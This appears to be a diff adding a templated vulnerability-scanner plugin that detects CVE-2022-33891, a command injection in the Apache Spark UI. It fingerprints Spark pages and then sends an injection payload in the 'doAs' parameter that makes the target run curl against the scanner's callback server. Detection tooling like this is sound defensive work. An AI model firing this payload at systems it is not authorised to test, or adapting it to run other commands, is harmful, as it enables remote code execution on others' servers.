@@ -1,0 +1,91 @@
+# proto-file: proto/templated_plugin.proto
+# proto-message: TemplatedPlugin
+
+###############
+# PLUGIN INFO #
+###############
+
+info: {
+  type: VULN_DETECTION
+  name: "ApacheSpark_CVE_2022_33891"
+  author: 
+    "Robert Dick (robert@doyensec.com) for the Templated version,"
+    " OccamsXor for the original Java version"
+  version: "2.0"
+}
+
+finding: {
+  main_id: {
+    publisher: "TSUNAMI_COMMUNITY"
+    value: "CVE_2022_33891"
+  }
+  severity: CRITICAL
+  title: "CVE-2022-33891 Apache Spark UI RCE"
+  description: 
+    "The Apache Spark UI has spark.acls.enable configuration option which provides"
+    " capability to modify the application according to user's permissions."
+    " When the config is true, the vulnerable versions of Spark checks the"
+    " group membership of the user without proper controls, that results in"
+    " blind command injection in username parameter."
+  recommendation:
+    "You can upgrade your Spark instances to 3.2.2, or 3.3.0 or later"
+  related_id: {
+    publisher:"CVE"
+    value: "CVE-2022-33891"
+  }
+}
+
+###########
+# ACTIONS #
+###########
+
+actions: {
+  name: "fingerprint_spark"
+  http_request: {
+    method: GET
+    uri: "/"
+    response: {
+      http_status: 200
+      expect_any {
+        conditions: [
+          { body: {} contains: '<title>Spark Master at ' },
+          { body: {} contains: '<title>Spark Worker at ' }
+        ]
+      }
+    }
+  }
+}
+
+actions: {
+  name: "execute_command"
+  http_request: {
+    method: GET
+    uri: "/?doAs=`curl%20{{ T_CBS_URI }}`"
+  }
+}
+
+actions: {
+  name: "sleep"
+  utility: { sleep: { duration_ms: 1000 } }
+}
+
+actions: {
+  name: "check_callback_server_logs"
+  callback_server: { action_type: CHECK }
+}
+
+#############
+# WORKFLOWS #
+#############
+
+workflows: {
+  condition: REQUIRES_CALLBACK_SERVER
+  actions: [
+    "fingerprint_spark",
+    "execute_command",
+    "sleep",
+    "check_callback_server_logs"
+  ]
+}
+
+config: { debug: true }
